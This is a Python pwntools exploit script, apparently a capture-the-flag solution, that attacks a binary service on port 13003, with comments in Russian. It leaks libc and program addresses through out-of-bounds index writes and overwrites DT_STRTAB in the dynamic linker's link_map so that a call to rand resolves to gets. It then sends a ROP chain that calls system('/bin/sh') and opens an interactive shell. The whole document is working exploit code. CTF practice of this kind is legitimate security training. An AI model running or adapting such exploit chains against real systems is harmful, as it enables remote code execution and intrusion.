#!/usr/bin/env python3
import sys
from pwn import *

def cmd(c):
    io.sendlineafter(b'> ', str(c).encode())

def send(c):
    io.sendlineafter(b': ', str(c).encode())

def init():
    send(0x3fff)

def add(idx, val):
    send(idx); send(val)

def new():
    io.sendlineafter(b': ', b'y')

context.binary = exe = ELF('./run')
libc = ELF('./libc.so.6')

if args.LOCAL:
    context.terminal = ['tmux','splitw','-h','-p','77']
    io = process([exe.path], env={'LD_PRELOAD':'./libc.so.6', 'TOKEN':'task_token'})
else:
    io = remote(sys.argv[1], 13003)


io.sendlineafter(b'token: ', b'task_token')

init(); add(-9, 0)
io.recvuntil(b'is ')
libc.address = int(io.recvline()) - 0x2672e0
log.success('libc: ' + hex(libc.address))
link_map = libc.address+0x2672e0
log.info(f'link_map: {link_map:#x}')
new()

init(); add(-2, 0)
io.recvuntil(b'is ')
exe.address = int(io.recvline()) - 0x4078
log.success('exe: ' + hex(exe.address))
storage = exe.address+0x40a0
log.info('storage: ' + hex(storage))
new()

# перепишем `DT_STRTAB` в `link_map`
init(); add((link_map+0x60 - storage)//0x10+1, storage-0x30-(exe.address+0x3e78)); new()
# запишем адрес строки `gets`
init(); add(-2, (libc.address+0x1D800-0x2f) - (exe.address+0x4078)); new()

# gdb.attach(io, 'set $l={libc.address}\nset $s={storage}\nset $b={exe.address}\nb *main+873\nc\n'.format(**locals()))

# вызовем `rand`
init(); add(10, 0)

pop_rdi = libc.address+0x8CD00
ret = libc.address+0x8CD01

pl = flat([
    exe.address+0x4080,
    0,
    exe.address+0x3df0,
    libc.address+0x264040,
    0,
    ret,
    pop_rdi, next(libc.search(b'/bin/sh\0')),
    libc.sym.system
], word_size=64)
io.sendline(b'a'*0x21d0 + pl)

io.interactive()
